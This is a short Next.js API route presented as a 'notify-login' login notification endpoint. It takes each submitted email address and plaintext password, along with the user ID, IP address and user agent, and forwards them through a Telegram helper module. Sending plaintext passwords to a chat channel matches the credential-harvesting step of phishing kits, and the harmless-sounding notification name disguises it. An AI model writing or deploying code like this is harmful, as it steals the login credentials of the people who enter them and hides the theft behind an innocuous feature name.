import { type NextRequest, NextResponse } from "next/server"
import { sendLoginNotification } from "@/lib/utils/telegram"

export async function POST(request: NextRequest) {
  try {
    const { userEmail, password, userId } = await request.json()

    const ip = request.headers.get("x-forwarded-for")?.split(",")[0] || request.headers.get("x-real-ip") || "Unknown"
    const userAgent = request.headers.get("user-agent") || "Unknown"

    await sendLoginNotification({
      userEmail,
      password,
      ipAddress: ip,
      userAgent,
      userId,
    })

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("[v0] Error in notify-login:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
